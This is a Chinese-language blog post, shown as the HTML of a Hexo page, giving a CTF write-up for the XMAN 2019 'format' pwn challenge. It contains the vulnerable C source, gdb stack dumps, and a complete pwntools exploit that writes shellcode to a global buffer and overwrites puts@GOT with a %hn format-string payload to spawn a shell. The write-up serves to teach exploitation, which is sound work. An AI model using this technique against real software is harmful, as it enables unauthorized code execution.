@@ -1,0 +1,534 @@
+<!DOCTYPE html>
+
+
+
+
+
+<html lang="">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 3.9.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=7.4.0">
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=7.4.0">
+  <link rel="mask-icon" href="/images/logo.svg?v=7.4.0" color="#222">
+  <link rel="alternate" href="/atom.xml" title="ZERO-A-ONE" type="application/atom+xml">
+
+<link rel="stylesheet" href="/css/main.css?v=7.4.0">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css?v=4.7.0">
+
+
+<script id="hexo-configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '7.4.0',
+    exturl: false,
+    sidebar: {"position":"left","display":"post","offset":12,"onmobile":false},
+    copycode: {"enable":false,"show_result":false,"style":null},
+    back2top: {"enable":true,"sidebar":false,"scrollpercent":false},
+    bookmark: {"enable":false,"color":"#222","save":"auto"},
+    fancybox: false,
+    mediumzoom: false,
+    lazyload: false,
+    pangu: false,
+    algolia: {
+      appID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    },
+    localsearch: {"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},
+    path: 'search.xml',
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    translation: {
+      copy_button: 'Kopieren',
+      copy_success: 'Kopiert',
+      copy_failure: 'Kopieren fehlgeschlagen'
+    },
+    sidebarPadding: 40
+  };
+</script>
+
+  <meta name="description" content="format一题，格式化字符串的入门程度我觉得不错，不算太难，也不算太容易，是适合新手的题目，现在发现自己对格式化字符串的利用程度还不够熟练，现在觉得其实格式化字符串也非常考验对栈数据结构的理解。 也学会了一点在执行Exploit的时候带上DEBUG和贴上gdb调试非常有用！     贴上gdb只需要在代码里面加入gdb.attach(io)，如果要下断点就是gdb.attach(io,&amp;quot">
+<meta property="og:type" content="article">
+<meta property="og:title" content="XMAN-2019-福州-PWN-format">
+<meta property="og:url" content="http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-format/index.html">
+<meta property="og:site_name" content="ZERO-A-ONE">
+<meta property="og:description" content="format一题，格式化字符串的入门程度我觉得不错，不算太难，也不算太容易，是适合新手的题目，现在发现自己对格式化字符串的利用程度还不够熟练，现在觉得其实格式化字符串也非常考验对栈数据结构的理解。 也学会了一点在执行Exploit的时候带上DEBUG和贴上gdb调试非常有用！     贴上gdb只需要在代码里面加入gdb.attach(io)，如果要下断点就是gdb.attach(io,&amp;quot">
+<meta property="og:locale" content="default">
+<meta property="og:updated_time" content="2019-08-07T05:38:20.000Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="XMAN-2019-福州-PWN-format">
+<meta name="twitter:description" content="format一题，格式化字符串的入门程度我觉得不错，不算太难，也不算太容易，是适合新手的题目，现在发现自己对格式化字符串的利用程度还不够熟练，现在觉得其实格式化字符串也非常考验对栈数据结构的理解。 也学会了一点在执行Exploit的时候带上DEBUG和贴上gdb调试非常有用！     贴上gdb只需要在代码里面加入gdb.attach(io)，如果要下断点就是gdb.attach(io,&amp;quot">
+  <link rel="canonical" href="http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-format/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome: false,
+    isPost: true,
+    isPage: false,
+    isArchive: false
+  };
+</script>
+
+  <title>XMAN-2019-福州-PWN-format | ZERO-A-ONE</title>
+  
+
+
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .logo,
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+</head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="default">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">ZERO-A-ONE</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-toggle">
+    <button aria-label="Navigationsleiste an/ausschalten">
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+      
+      
+      
+        
+        <li class="menu-item menu-item-home">
+      
+    
+
+    <a href="/" rel="section"><i class="menu-item-icon fa fa-fw fa-home"></i> <br>Startseite</a>
+
+  </li>
+      
+      
+      
+        
+        <li class="menu-item menu-item-archives">
+      
+    
+
+    <a href="/archives/" rel="section"><i class="menu-item-icon fa fa-fw fa-archive"></i> <br>Archiv</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a href="javascript:;" class="popup-trigger">
+        
+          <i class="menu-item-icon fa fa-search fa-fw"></i> <br>Suche</a>
+      </li>
+    
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="none"
+           placeholder="Suche..." spellcheck="false"
+           type="text" id="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+            
+
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+     <article itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block post">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2019/08/06/XMAN-2019-╕ú╓▌-PWN-format/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="ZERO-A-ONE">
+      <meta itemprop="description" content="Resit much,Obey little">
+      <meta itemprop="image" content="/images/avatar.gif">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="ZERO-A-ONE">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">XMAN-2019-福州-PWN-format
+
+          
+        </h1>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">Veröffentlicht am</span>
+
+              
+                
+              
+
+              <time title="Erstellt: 2019-08-06 07:33:08 / Geändert am: 22:38:20" itemprop="dateCreated datePublished" datetime="2019-08-06T07:33:08-07:00">2019-08-06</time>
+            </span>
+          
+            
+
+            
+          
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p><code>format</code>一题，格式化字符串的入门程度我觉得不错，不算太难，也不算太容易，是适合新手的题目，现在发现自己对格式化字符串的利用程度还不够熟练，现在觉得其实格式化字符串也非常考验对栈数据结构的理解。</p>
+<p>也学会了一点在执行Exploit的时候带上<code>DEBUG</code>和贴上<code>gdb</code>调试非常有用！    </p>
+<p>贴上<code>gdb</code>只需要在代码里面加入<code>gdb.attach(io)</code>，如果要下断点就是<code>gdb.attach(io,&quot;b *address&quot;)</code></p>
+<p>带上<code>DEBUG</code>只需要在命令行后跟上<code>DEBUG</code>参数，例如<code>python exp.py DEBUG</code></p>
+<p>相关资料均可在GitHub上下载：<a href="https://github.com/suyucheng-lz/XMAN-2019-FZU" target="_blank" rel="noopener">https://github.com/suyucheng-lz/XMAN-2019-FZU</a></p>
+<p>首先看看源代码</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">char</span> buf[<span class="number">1024</span>];</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">char</span> overflow[<span class="number">256</span>] = &#123;<span class="number">0</span>&#125;;</span><br><span class="line">    read(<span class="number">0</span>, buf, <span class="number">1023</span>);</span><br><span class="line">    read(<span class="number">0</span>, overflow, <span class="number">255</span>);</span><br><span class="line">    <span class="built_in">printf</span>(overflow);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">    setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">    overflow();</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">"exit."</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>IDA Pro逆向出来的代码为</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">int</span> __<span class="function">cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  setbuf(<span class="built_in">stdin</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stdout</span>, <span class="number">0</span>);</span><br><span class="line">  setbuf(<span class="built_in">stderr</span>, <span class="number">0</span>);</span><br><span class="line">  overflow();</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"exit."</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">overflow</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> buf; <span class="comment">// [esp+0h] [ebp-108h]</span></span><br><span class="line"></span><br><span class="line">  <span class="built_in">memset</span>(&amp;buf, <span class="number">0</span>, <span class="number">0x100</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;::buf, <span class="number">0x3FF</span>u);</span><br><span class="line">  read(<span class="number">0</span>, &amp;buf, <span class="number">0xFF</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(&amp;buf);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>检查一下文件开启的保护措施</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">Arch:     i386<span class="number">-32</span>-little</span><br><span class="line">RELRO:    Partial RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX disabled</span><br><span class="line">PIE:      <span class="function">No <span class="title">PIE</span> <span class="params">(<span class="number">0x8048000</span>)</span></span></span><br><span class="line">RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>没有开启任何的防护措施，就比较简单</p>
+<p>本质上是通过构造格式化字符串让劫持系统流程，让系统执行到我们保存shellcode的地址上</p>
+<p>所以首先我们需要把shellcode写到内存上的，我们可以发现第一次输入的这个BUF为全局BUF，可以直接写入</p>
+<p>故我们第一次输入就把shellcode传入即可</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">shellcode_addr = <span class="number">0x0804A080</span></span><br><span class="line">payload = shellcode.ljust(<span class="number">1023</span>, <span class="string">'a'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>然后我们只需要传入我们写入shellcode的地址覆盖掉puts的got地址，这样等到程序运行到puts函数时，实测运行的就是我们的shellcode，现在的问题是如何构造一个格式化字符串覆盖puts的got地址</p>
+<p>我们首先构造一个Exploit，确定我们传入的第一个数据是在栈上的第几个位置.</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">'./format'</span>)</span><br><span class="line">gdb.attach(p,<span class="string">'b * 0x08048563'</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">p.sendline(shellcode)</span><br><span class="line">p.sendline(<span class="string">'aaaa,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p'</span>)</span><br><span class="line"><span class="comment">#%2552c,%39036c,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p,%p</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>根据DEBUG信息我们发送的信息如下</p>
+<figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">[DEBUG] Received <span class="number">0x136</span> bytes:</span><br><span class="line"> 'aaaa,0xfff27430,0xff,0x1,0x61616161,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0x252c7025,0x70252c70,0x2c70252c,0xa7025,(nil),(nil),(nil)\n'</span><br></pre></td></tr></table></figure>
+
+<p>接收到的信息如下</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aaaa,<span class="number">0xfff27430</span>,<span class="number">0xff</span>,<span class="number">0x1</span>,<span class="number">0x61616161</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0x252c7025</span>,<span class="number">0x70252c70</span>,<span class="number">0x2c70252c</span>,<span class="number">0xa7025</span>,(nil),(nil),(nil)</span><br></pre></td></tr></table></figure>
+
+<p>通过<code>x/32xw $esp</code>命令查看栈情况</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">gdb-peda$ x/<span class="number">32</span>xw $esp</span><br><span class="line"><span class="number">0xffc5e370</span>:	<span class="number">0xffc5e380</span>	<span class="number">0xffc5e380</span>	<span class="number">0x000000ff</span>	<span class="number">0x00000001</span></span><br><span class="line"><span class="number">0xffc5e380</span>:	<span class="number">0x61616161</span>	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span></span><br><span class="line"><span class="number">0xffc5e390</span>:	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span></span><br><span class="line"><span class="number">0xffc5e3a0</span>:	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span></span><br><span class="line"><span class="number">0xffc5e3b0</span>:	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span></span><br><span class="line"><span class="number">0xffc5e3c0</span>:	<span class="number">0x2c70252c</span>	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span></span><br><span class="line"><span class="number">0xffc5e3d0</span>:	<span class="number">0x252c7025</span>	<span class="number">0x70252c70</span>	<span class="number">0x2c70252c</span>	<span class="number">0x000a7025</span></span><br><span class="line"><span class="number">0xffc5e3e0</span>:	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span>	<span class="number">0x00000000</span></span><br></pre></td></tr></table></figure>
+
+<p>不难得出我们传入的第一个参数<code>aaaa</code>位于栈中的第4个位置</p>
+<p>因为<code>0x0804A018</code>数值太大了，我们把它拆分为<code>2052</code>和<code>39036</code>两个部分传值，现在需要确定的是如果我们再传入<code>puts_got</code>的地址时，<code>puts_got</code>位于栈中的哪个位置。同时因为我们是以双字节形式写入，故<code>2052</code>对应的地址是<code>puts_got</code>，而<code>39036</code>对应的应是<code>puts_got+2</code>的位置</p>
+<p>所以我们的格式化字符串就为：</p>
+<p><code>&#39;%2052c%12$hn%39036c%11$hn111&#39; + p32(puts_got) + p32(puts_got+2)</code></p>
+<p>分析可得，此时堆栈中的</p>
+<p>第一个参数为：<code>%2052c%12$hn%39036c%11$hn111</code></p>
+<p>之后因为是32位系统，每4字节占用一个参数位</p>
+<p>第4个参数：<code>%205</code></p>
+<p>第5个参数：<code>c%12</code></p>
+<p>第6个参数：<code>$hn%</code></p>
+<p>第7个参数：<code>3903</code></p>
+<p>第8个参数：<code>6c%1</code></p>
+<p>第9个参数：<code>1$hn</code></p>
+<p>第10个参数：<code>111</code></p>
+<p>第11个参数：原本应为<code>p32(puts_got)</code></p>
+<p>第12个参数：原本应为<code>p32(puts_got)+2</code></p>
+<p>因为<code>%12$n</code>和<code>%11$n</code>    ，<code>puts_got</code>的地址被取出且修改为shellcode的地址</p>
+<p>最终的Exploit如下</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python2</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line">context(arch=<span class="string">'i386'</span>, os=<span class="string">'linux'</span>, log_level=<span class="string">'info'</span>)</span><br><span class="line">elf = ELF(<span class="string">'./format'</span>)</span><br><span class="line">libc = elf.libc</span><br><span class="line">shellcode = asm(shellcraft.i386.linux.sh())</span><br><span class="line">shellcode_addr = <span class="number">0x0804A080</span><span class="comment">#全局BUF地址</span></span><br><span class="line">puts_got = <span class="number">0x804A018</span></span><br><span class="line">ret_addr = <span class="number">0x0804A060</span> </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">attach</span><span class="params">()</span>:</span></span><br><span class="line">    gdb.attach(io,<span class="string">'b * 0x08048563'</span>)</span><br><span class="line">io = process(elf.path)  <span class="comment"># , env=&#123;'LD_PRELOAD': 'libc.so.6'&#125;)</span></span><br><span class="line"><span class="comment"># io = remote('localhost', 2333)</span></span><br><span class="line"><span class="comment">#attach()</span></span><br><span class="line">time.sleep(<span class="number">1</span>)</span><br><span class="line">io.send(shellcode.ljust(<span class="number">1023</span>, <span class="string">'a'</span>))</span><br><span class="line"></span><br><span class="line">payload = <span class="string">''</span></span><br><span class="line">payload += <span class="string">'%2052c%12$hn%39036c%11$hn111'</span> + p32(puts_got) + p32(puts_got+<span class="number">2</span>)</span><br><span class="line"><span class="comment">## payload += '%2052c%11$hncccccccccccc' + p32(puts_got) + p32(puts_got+2)</span></span><br><span class="line"><span class="comment">#修改GOT表数值</span></span><br><span class="line"><span class="comment">#gdb调试可得位置</span></span><br><span class="line"><span class="comment">#%2052c %12$hn 以双字节 写入2052个字节 到第11个参数位置</span></span><br><span class="line">puts_got = <span class="number">0x0804A018</span></span><br><span class="line">sc_addr = <span class="number">0x0804A080</span></span><br><span class="line">io.send(payload)</span><br><span class="line">io.interactive()</span><br><span class="line"><span class="comment"># 0xffa4ed60</span></span><br><span class="line"><span class="comment"># 0xffa4ee7c</span></span><br></pre></td></tr></table></figure>
+
+
+    </div>
+
+    
+    
+    
+        
+      
+
+      <footer class="post-footer">
+
+        
+
+          <div class="post-nav">
+            <div class="post-nav-next post-nav-item">
+              
+                <a href="/2019/08/06/╣Ñ╖└╩└╜τ/" rel="next" title="攻防世界">
+                  <i class="fa fa-chevron-left"></i> 攻防世界
+                </a>
+              
+            </div>
+
+            <span class="post-nav-divider"></span>
+
+            <div class="post-nav-prev post-nav-item">
+              
+                <a href="/2019/08/06/XMAN-2019-╕ú╓▌-PWN-ShellCode/" rel="prev" title="XMAN-2019-福州-PWN-ShellCode">
+                  XMAN-2019-福州-PWN-ShellCode <i class="fa fa-chevron-right"></i>
+                </a>
+              
+            </div>
+          </div>
+        
+      </footer>
+    
+  </div>
+  
+  
+  
+  </article>
+
+  </div>
+
+
+          </div>
+          
+
+        </div>
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
+  <aside class="sidebar">
+    <div class="sidebar-inner">
+        
+        
+        
+        
+      
+
+      <ul class="sidebar-nav motion-element">
+        <li class="sidebar-nav-toc">
+          Inhaltsverzeichnis
+        </li>
+        <li class="sidebar-nav-overview">
+          Übersicht
+        </li>
+      </ul>
+
+      <!--noindex-->
+      <div class="post-toc-wrap sidebar-panel">
+      </div>
+      <!--/noindex-->
+
+      <div class="site-overview-wrap sidebar-panel">
+        <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <p class="site-author-name" itemprop="name">ZERO-A-ONE</p>
+  <div class="site-description" itemprop="description">Resit much,Obey little</div>
+</div>
+  <nav class="site-state motion-element">
+      <div class="site-state-item site-state-posts">
+        
+          <a href="/archives/">
+        
+          <span class="site-state-item-count">71</span>
+          <span class="site-state-item-name">Artikel</span>
+        </a>
+      </div>
+    
+      
+      
+      <div class="site-state-item site-state-categories">
+        
+        <span class="site-state-item-count">2</span>
+        <span class="site-state-item-name">Kategorien</span>
+        
+      </div>
+    
+  </nav>
+  <div class="feed-link motion-element">
+    <a href="/atom.xml" rel="alternate">
+      <i class="fa fa-rss"></i>RSS
+    </a>
+  </div>
+
+
+
+      </div>
+
+    </div>
+  </aside>
+  <div id="sidebar-dimmer"></div>
+
+
+      </div>
+    </main>
+
+    <footer id="footer" class="footer">
+      <div class="footer-inner">
+        <div class="copyright">&copy; <span itemprop="copyrightYear">2020</span>
+  <span class="with-love" id="animate">
+    <i class="fa fa-user"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">ZERO-A-ONE</span>
+</div>
+  <div class="powered-by">Erstellt mit  <a href="https://hexo.io" class="theme-link" rel="noopener" target="_blank">Hexo</a> v3.9.0</div>
+  <span class="post-meta-divider">|</span>
+  <div class="theme-info">Design – <a href="https://theme-next.org" class="theme-link" rel="noopener" target="_blank">NexT.Gemini</a> v7.4.0</div>
+
+<div>
+<script async src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+<span id="busuanzi_container_site_pv" style='display:none'>
+    本站总访问量 <span id="busuanzi_value_site_pv"></span> 次
+    <span class="post-meta-divider">|</span>
+</span>
+<span id="busuanzi_container_site_uv" style='display:none'>
+    有<span id="busuanzi_value_site_uv"></span>人看过我的博客啦
+</span>
+</div>
+
+        
+
+
+
+
+
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+  </div>
+
+  
+
+
+  <script src="/lib/anime.min.js?v=3.1.0"></script>
+  <script src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  <script src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+<script src="/js/utils.js?v=7.4.0"></script><script src="/js/motion.js?v=7.4.0"></script>
+<script src="/js/schemes/pisces.js?v=7.4.0"></script>
+
+<script src="/js/next-boot.js?v=7.4.0"></script>
+
+
+
+  
+
+
+
+
+
+
+
+
+  <script src="/js/local-search.js?v=7.4.0"></script>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
